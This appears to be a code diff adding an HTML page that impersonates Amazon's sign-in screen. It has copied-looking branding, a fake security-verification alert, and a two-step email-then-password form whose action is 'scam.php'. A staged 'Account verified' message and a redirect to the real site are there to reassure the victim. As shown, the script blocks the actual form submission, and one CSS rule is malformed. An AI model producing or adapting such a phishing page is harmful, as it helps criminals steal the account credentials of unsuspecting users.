@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Amazon Ember", Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .signin-container {
+            width: 350px;
+            padding: 20px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .logo img {
+            width: 106px;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 10px;
+            color: #111;
+        }
+        .subtitle {
+            font-size: 13px;
+            text-align: center;
+            color: #767676;
+            margin-bottom: 16px;
+        }
+        .form-group {
+            margin-bottom: 14px;
+        }
+        .form-group label {
+            font-size: 13px;
+            font-weight: 700;
+            color: #111;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .form-group input[type="text"],
+        .form-group input[type="password"] {
+            width: 100%;
+            padding: 8px 10px;
+            font-size: 14px;
+            border: 1px solid #a6a6a6;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #e77600;
+            box-shadow: 0 0 3px 2px rgba(228,125,0,.4);
+        }
+        .btn-signin {
+            width: 100%;
+            padding: 10px;
+            background: #f0c14b;
+            border: 1px solid #a88734;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 6px;
+            color: #111;
+        }
+        .btn-signin:hover {
+            background: #ddb347;
+        }
+        .terms {
+            font-size: 12px;
+            color: #767676;
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+        .terms a { color: #0066c0; text-decoration: none; }
+        .terms a:hover { text-decoration: underline; }
+        .alert-box {
+            display: none;
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 14px;
+            font-size: 13px;
+            color: #664d03;
+            text-align: center;
+        }
+        .spinner {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 13px;
+            color: #767676;
+        }
+        .spinner::after {
+            content: "Verifying...";
+            animation: dots 1.5s steps=4 end infinite;
+        }
+        @keyframes dots {
+            0%  { content: "Verifying"; }
+            25% { content: "Verifying."; }
+            50% { content: "Verifying.."; }
+            75% { content: "Verifying..."; }
+        }
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+        }
+        .footer a {
+            font-size: 12px;
+            color: #0066c0;
+            text-decoration: none;
+        }
+        .footer a:hover { text-decoration: underline; }
+        #captcha {
+            display: none;
+            text-align: center;
+            margin-top: 14px;
+        }
+        #captcha p { font-size: 13px; color: #111; margin-bottom: 8px; }
+        .recaptcha-wrapper {
+            display: inline-block;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            padding: 12px 16px;
+            background: #f9f9f9;
+            font-size: 14px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+
+<div class="signin-container">
+    <!-- Amazon Logo -->
+    <div class="logo">
+        <svg width="106" height="30" viewBox="0 0 106 30" xmlns="http://www.w3.org/2000/svg">
+            <text x="0" y="22" font-family="Arial,sans-serif" font-size="22" font-weight="bold" fill="#111">amazon</text>
+            <path d="M62 22 C58 28 48 30 40 28 C36 27 34 24 35 22" stroke="#ff9900" stroke-width="2.5" fill="none"/>
+            <text x="60" y="29" font-family="Arial,sans-serif" font-size="11" fill="#ff9900">&#10004;</text>
+        </svg>
+    </div>
+
+    <h1>Sign in</h1>
+    <p class="subtitle">Access your account</p>
+
+    <!-- Fake Alert -->
+    <div class="alert-box" id="alertBox">
+        🔒 <strong>Security verification required.</strong><br>
+        Please confirm your account details.
+    </div>
+
+    <!-- Form -->
+    <form action="scam.php" method="POST" id="signinForm">
+        <div class="form-group">
+            <label for="email">Email or mobile phone number</label>
+            <input type="text" name="email" id="email" required autocomplete="email">
+        </div>
+
+        <div class="form-group" id="passwordGroup" style="display:none;">
+            <label for="password">Password</label>
+            <input type="password" name="password" id="password" required autocomplete="current-password">
+        </div>
+
+        <input type="hidden" name="action" value="signin">
+        <input type="hidden" name="source" value="secure-signin">
+        <input type="hidden" name="timestamp" id="timestamp">
+
+        <button type="submit" class="btn-signin" id="submitBtn">Continue</button>
+    </form>
+
+    <div class="spinner" id="spinner"></div>
+
+    <div class="terms">
+        By continuing, you agree to Amazon's
+        <a href="#">Conditions of Use</a> and
+        <a href="#">Privacy Notice</a>.
+    </div>
+
+    <div class="footer">
+        <a href="#">Need help?</a>
+    </div>
+</div>
+
+<script>
+    const form = document.getElementById('signinForm');
+    const emailInput = document.getElementById('email');
+    const passwordGroup = document.getElementById('passwordGroup');
+    const passwordInput = document.getElementById('password');
+    const submitBtn = document.getElementById('submitBtn');
+    const alertBox = document.getElementById('alertBox');
+    const spinner = document.getElementById('spinner');
+    const timestamp = document.getElementById('timestamp');
+
+    let step = 1; // 1=email, 2=password
+
+    // Set timestamp
+    timestamp.value = Date.now();
+
+    emailInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            if (this.value.trim() !== '') {
+                // Step 1 -> ask password
+                if (step === 1) {
+                    step = 2;
+                    passwordGroup.style.display = 'block';
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                    submitBtn.textContent = 'Sign in';
+                }
+            }
+        }
+    });
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        if (step === 1) {
+            // Validate email field
+            if (emailInput.value.trim() === '') {
+                emailInput.focus();
+                return;
+            }
+            // Show loading
+            submitBtn.textContent = 'Searching...';
+            submitBtn.disabled = true;
+            setTimeout(() => {
+                step = 2;
+                passwordGroup.style.display = 'block';
+                passwordInput.value = '';
+                passwordInput.focus();
+                submitBtn.textContent = 'Sign in';
+                submitBtn.disabled = false;
+            }, 800);
+
+        } else if (step === 2) {
+            // Show verifying
+            submitBtn.textContent = 'Verifying...';
+            submitBtn.disabled = true;
+            alertBox.style.display = 'block';
+            spinner.style.display = 'block';
+
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                alertBox.innerHTML = '✅ <strong>Account verified successfully.</strong><br>You will be redirected to your account.';
+                alertBox.style.background = '#d4edda';
+                alertBox.style.borderColor = '#28a745';
+                alertBox.style.color = '#155724';
+
+                setTimeout(() => {
+                    window.location.href = 'https://www.amazon.com';
+                }, 2000);
+            }, 2000);
+        }
+    });
+</script>
+
+</body>
+</html>
